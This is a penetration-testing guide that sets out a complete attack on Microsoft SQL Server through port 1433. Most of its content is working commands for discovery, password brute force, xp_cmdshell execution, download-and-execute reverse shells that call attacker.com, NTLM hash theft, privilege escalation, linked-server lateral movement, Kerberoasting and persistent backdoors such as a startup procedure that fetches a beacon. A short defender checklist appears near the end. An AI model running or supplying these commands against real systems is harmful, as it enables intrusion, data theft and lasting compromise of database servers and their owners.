# Port 1433 - MSSQL (Microsoft SQL Server) - Complete Attack Guide

## Overview

**Protocol**: Microsoft SQL Server
**Port**: 1433 (default), 1434 (SQL Browser), dynamic ports
**Transport**: TCP
**Encryption**: Optional (TLS/SSL)
**Authentication**: Windows, SQL Authentication, Azure AD

## Attack Objectives

- **Credential Brute Force**: Crack SQL Server credentials
- **Command Execution**: Execute OS commands via xp_cmdshell
- **Data Extraction**: Dump databases and tables
- **Privilege Escalation**: Gain sysadmin/sa access
- **Lateral Movement**: Access linked servers
- **Hash Theft**: Extract NTLM hashes
- **Backdoor Installation**: Maintain persistent access

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect MSSQL Service**
```bash
# Quick scan
nmap -p 1433 192.168.1.100

# Service version
nmap -p 1433 -sV 192.168.1.100

# MSSQL scripts
nmap -p 1433 --script ms-sql-* 192.168.1.100

# Network-wide discovery
nmap -p 1433 192.168.1.0/24 --open

# SQL Server Browser (UDP 1434)
nmap -sU -p 1434 192.168.1.100
```

**1.2 Banner Grabbing and Enumeration**
```bash
# Using Nmap
nmap -p 1433 --script ms-sql-info 192.168.1.100

# Get version
nmap -p 1433 --script ms-sql-info,ms-sql-config 192.168.1.100

# Named instances (via SQL Browser)
nmap -sU -p 1434 --script ms-sql-discover 192.168.1.100

# Using Metasploit
msfconsole
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 192.168.1.100
run
```

**1.3 Check for Empty/Weak SA Password**
```bash
# Test empty sa password
nmap -p 1433 --script ms-sql-empty-password 192.168.1.100

# Common weak passwords
sqsh -S 192.168.1.100 -U sa -P ''
sqsh -S 192.168.1.100 -U sa -P 'sa'
sqsh -S 192.168.1.100 -U sa -P 'password'
```

### Phase 2: Credential Attacks

**2.1 Default Credentials**
```bash
# Common defaults
sa:[blank]
sa:sa
sa:password
sa:Password123
sa:admin
sa:sql
BUILTIN\Administrators:[blank]

# Application accounts
sqlserver:sqlserver
admin:admin
```

**2.2 Brute Force Attack**

**Using Hydra**:
```bash
# Single user
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt mssql://192.168.1.100

# Windows Authentication
hydra -l 'DOMAIN\user' -P passwords.txt mssql://192.168.1.100

# Limit threads
hydra -l sa -P passwords.txt mssql://192.168.1.100 -t 4 -w 5
```

**Using Medusa**:
```bash
medusa -h 192.168.1.100 -u sa -P passwords.txt -M mssql
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M mssql
```

**Using Metasploit**:
```bash
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
set USE_WINDOWS_AUTHENT false
run
```

**Using CrackMapExec**:
```bash
crackmapexec mssql 192.168.1.100 -u sa -p passwords.txt
crackmapexec mssql 192.168.1.100 -u users.txt -p 'Password123'
```

**2.3 Windows Authentication Attack**
```bash
# If MSSQL uses Windows auth
# Use domain credentials

# Using Impacket mssqlclient
mssqlclient.py DOMAIN/username:password@192.168.1.100

# Using CrackMapExec
crackmapexec mssql 192.168.1.100 -u administrator -p password -d DOMAIN

# Pass-the-Hash
mssqlclient.py DOMAIN/administrator@192.168.1.100 -hashes :NTLMHASH
```

### Phase 3: Post-Authentication Exploitation

**3.1 Enable xp_cmdshell**
```bash
# Connect to MSSQL
mssqlclient.py sa:password@192.168.1.100

# Enable xp_cmdshell (if sysadmin)
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

# Execute OS commands
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'ipconfig';
SQL> EXEC xp_cmdshell 'net user';

# Using Metasploit
use auxiliary/admin/mssql/mssql_exec
set RHOSTS 192.168.1.100
set USERNAME sa
set PASSWORD password
set CMD whoami
run
```

**3.2 Get Reverse Shell**
```bash
# PowerShell reverse shell
SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/rev.ps1'')"';

# Certutil download and execute
SQL> EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/shell.exe C:\temp\shell.exe';
SQL> EXEC xp_cmdshell 'C:\temp\shell.exe';

# Using Metasploit exploit
use exploit/windows/mssql/mssql_payload
set RHOSTS 192.168.1.100
set USERNAME sa
set PASSWORD password
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit
```

**3.3 Data Extraction**
```bash
# List databases
SQL> SELECT name FROM master.dbo.sysdatabases;

# List tables in database
SQL> SELECT table_name FROM information_schema.tables WHERE table_schema='dbo';

# Dump data
SQL> USE sensitive_db;
SQL> SELECT * FROM users;
SQL> SELECT * FROM credit_cards;

# Export to file
SQL> SELECT * FROM users INTO OUTFILE 'C:\temp\users.txt';

# Using sqlcmd
sqlcmd -S 192.168.1.100 -U sa -P password -Q "SELECT * FROM database.dbo.users"

# Automated with Metasploit
use auxiliary/admin/mssql/mssql_enum
set RHOSTS 192.168.1.100
set USERNAME sa
set PASSWORD password
run
```

**3.4 Hash Extraction**
```bash
# Dump SQL Server hashes
SQL> SELECT name, password_hash FROM sys.sql_logins;

# In MSSQL 2005+
SQL> SELECT name, password_hash FROM master.sys.sql_logins;

# Using Metasploit
use auxiliary/scanner/mssql/mssql_hashdump
set RHOSTS 192.168.1.100
set USERNAME sa
set PASSWORD password
run

# Crack hashes
hashcat -m 1731 mssql_hashes.txt rockyou.txt  # MSSQL 2012+
hashcat -m 132 mssql_hashes.txt rockyou.txt   # MSSQL 2000
```

**3.5 Steal NTLM Hashes**
```bash
# MSSQL can authenticate to SMB shares
# Force MSSQL to connect to attacker SMB
# Captures NTLM hash

# Setup Responder
responder -I eth0

# Trigger authentication from MSSQL
SQL> EXEC master.dbo.xp_dirtree '\\attacker_ip\share';

# Or use xp_fileexist
SQL> EXEC master.dbo.xp_fileexist '\\attacker_ip\share\file.txt';

# Responder captures NTLM hash of SQL Server service account
# Crack with hashcat
hashcat -m 5600 ntlm_hash.txt rockyou.txt
```

### Phase 4: Privilege Escalation

**4.1 Impersonation Attack**
```bash
# Check if current user can impersonate others
SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

# Impersonate sa
SQL> EXECUTE AS LOGIN = 'sa';
SQL> SELECT SYSTEM_USER, USER;

# Now you have sa privileges!

# Using PowerUpSQL
Import-Module PowerUpSQL.ps1
Invoke-SQLAuditPrivImpersonateLogin -Instance "server\instance"
```

**4.2 Trustworthy Database Exploitation**
```bash
# If database has TRUSTWORTHY=ON and user is db_owner
# Can escalate to sysadmin

# Check TRUSTWORTHY databases
SQL> SELECT name FROM sys.databases WHERE is_trustworthy_on = 1;

# Create stored procedure with owner rights
SQL> USE trustworthy_db;
SQL> CREATE PROCEDURE sp_elevate
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'lowpriv_user','sysadmin';
GO

# Execute
SQL> EXEC sp_elevate;

# Now lowpriv_user is sysadmin!
```

**4.3 Agent Jobs (if SQL Server Agent enabled)**
```bash
# Create job that runs as sysadmin
# Requires SQLAgentUserRole

SQL> USE msdb;
SQL> EXEC dbo.sp_add_job @job_name = 'pwn_job';
SQL> EXEC dbo.sp_add_jobstep @job_name = 'pwn_job', @step_name = 'step1', @subsystem = 'CmdExec', @command = 'net user hacker Password123! /add';
SQL> EXEC dbo.sp_add_jobserver @job_name = 'pwn_job';
SQL> EXEC dbo.sp_start_job @job_name = 'pwn_job';
```

### Phase 5: Lateral Movement

**5.1 Linked Server Enumeration**
```bash
# List linked servers
SQL> SELECT * FROM sys.servers WHERE is_linked = 1;
SQL> EXEC sp_linkedservers;

# Test access
SQL> SELECT * FROM OPENQUERY([linked_server], 'SELECT @@VERSION');

# Execute commands on linked server
SQL> EXEC ('xp_cmdshell ''whoami''') AT [linked_server];

# Using PowerUpSQL
Get-SQLServerLinkCrawl -Instance server\instance
```

**5.2 Double-Hop Attack**
```bash
# If Server A trusts Server B, and B trusts C
# Can pivot: Attacker -> A -> B -> C

SQL> SELECT * FROM OPENQUERY([ServerB], 'SELECT * FROM OPENQUERY([ServerC], ''SELECT @@version'')');

# Execute commands
SQL> EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [ServerC]') AT [ServerB];
```

**5.3 SPNs and Kerberoasting**
```bash
# MSSQL servers run under service accounts
# If SPN registered, can Kerberoast

# Find MSSQL SPNs
setspn -T domain -Q MSSQLSvc/*

# Request TGS
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request

# Crack
hashcat -m 13100 tgs.txt rockyou.txt
```

### Phase 6: Persistence

**6.1 Create Backdoor User**
```bash
# Create SQL login
SQL> CREATE LOGIN backdoor WITH PASSWORD = 'SecurePass123!';
SQL> EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';

# Or Windows user
SQL> CREATE LOGIN [DOMAIN\backdoor] FROM WINDOWS;
SQL> EXEC sp_addsrvrolemember 'DOMAIN\backdoor', 'sysadmin';
```

**6.2 Startup Stored Procedure**
```bash
# Create procedure that runs on SQL Server startup
SQL> CREATE PROCEDURE sp_backdoor
AS
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/beacon.ps1'')"';
GO

# Mark as startup procedure
SQL> EXEC sp_procoption @ProcName = 'sp_backdoor', @OptionName = 'startup', @OptionValue = 'on';

# Executes on every SQL Server restart
```

**6.3 Extended Stored Procedure Backdoor**
```bash
# Upload custom DLL
# Register as extended stored procedure

SQL> EXEC sp_addextendedproc 'xp_backdoor', 'C:\backdoor.dll';

# Call anytime
SQL> EXEC xp_backdoor;
```

## Bypass Techniques

### Bypassing xp_cmdshell Restrictions
```bash
# If xp_cmdshell disabled and can't enable

# Method 1: OLE Automation
SQL> EXEC sp_configure 'Ole Automation Procedures', 1;
SQL> RECONFIGURE;
SQL> DECLARE @output INT;
SQL> EXEC sp_OACreate 'wscript.shell', @output OUTPUT;
SQL> EXEC sp_OAMethod @output, 'run', NULL, 'cmd /c whoami > C:\temp\out.txt';

# Method 2: Agent Jobs (if Agent enabled)
# See Phase 4.3

# Method 3: Custom CLR assemblies
# Requires .NET and appropriate permissions
```

### Bypassing Firewall
```bash
# SSH tunnel
ssh -L 1434:192.168.1.100:1433 user@jumphost
sqlcmd -S localhost,1434 -U sa -P password
```

## Information Extraction

**Critical Queries**:
```sql
-- Database list
SELECT name FROM master.dbo.sysdatabases;

-- User list
SELECT name FROM sys.server_principals WHERE type = 'S';

-- Sysadmin members
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin',name) = 1;

-- Linked servers
EXEC sp_linkedservers;

-- Version
SELECT @@VERSION;

-- Current user
SELECT SYSTEM_USER, USER_NAME();

-- Database size
EXEC sp_spaceused;
```

## Security Recommendations

**For Defenders**:
1. **Disable sa account** - Use named accounts
2. **Strong passwords** - Complex, long passwords
3. **Windows Authentication** - Prefer over SQL auth
4. **Disable xp_cmdshell** - Unless absolutely needed
5. **Least Privilege** - Don't grant sysadmin freely
6. **Network Isolation** - Firewall MSSQL access
7. **Encryption** - Force encrypted connections
8. **Audit Logging** - Monitor all access
9. **Remove TRUSTWORTHY** - On user databases
10. **Patch Regularly** - Keep SQL Server updated

## Practical Attack Scenario

```bash
# Discovery
nmap -p 1433 192.168.1.100
# MSSQL 2019 detected

# Try empty sa password
sqsh -S 192.168.1.100 -U sa -P ''
# Failed

# Brute force
hydra -l sa -P top1000.txt mssql://192.168.1.100
# SUCCESS: sa:Password1

# Connect
mssqlclient.py sa:Password1@192.168.1.100

# Enable xp_cmdshell
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

# Execute commands
SQL> EXEC xp_cmdshell 'whoami';
# nt authority\system

# Get reverse shell
SQL> EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker/shell.ps1")';

# Meterpreter session obtained!
# Full system compromise
```

## Tools Summary

**Best Tool for Each Task**:
- **Discovery**: Nmap
- **Brute Force**: Hydra, CrackMapExec
- **Exploitation**: Metasploit, Impacket
- **Data Extraction**: mssqlclient, sqlcmd
- **Privilege Escalation**: PowerUpSQL
- **Hash Cracking**: Hashcat

## Related Attacks

- **Port 445 (SMB)**: NTLM hash capture
- **Port 88 (Kerberos)**: Kerberoasting MSSQL SPNs
- **Port 1434**: SQL Server Browser enumeration
- **Linked Servers**: Lateral movement

---

**Last Updated**: 2026-06-16
